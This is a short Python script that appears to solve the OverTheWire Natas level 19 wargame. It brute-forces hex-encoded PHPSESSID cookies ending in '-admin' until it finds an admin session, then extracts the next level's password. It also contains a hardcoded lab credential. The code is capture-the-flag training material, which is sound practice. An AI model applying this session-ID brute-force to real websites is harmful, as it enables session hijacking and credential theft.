import requests
import binascii
import re
import os,sys

cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

username = "natas19"
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"

url = "http://%s.natas.labs.overthewire.org"%username
session = requests.Session()

for i in range(1,641):
	__id__ = b"%d-admin"%i
	hex_enc  = str(binascii.hexlify(__id__))[2:-1]
	print("Trying PHPSESSID (%s):"%i, hex_enc)
	response = session.post(url , cookies={"PHPSESSID" : hex_enc }, auth=(username,password))
	content = response.text

	if "You are an admin." in content:
		HashValue = re.findall("Username: natas20\nPassword: (.*)</pre>" ,content)[0]
		print("[+] Gotcha :",HashValue)
		break
	os.system(cmd)

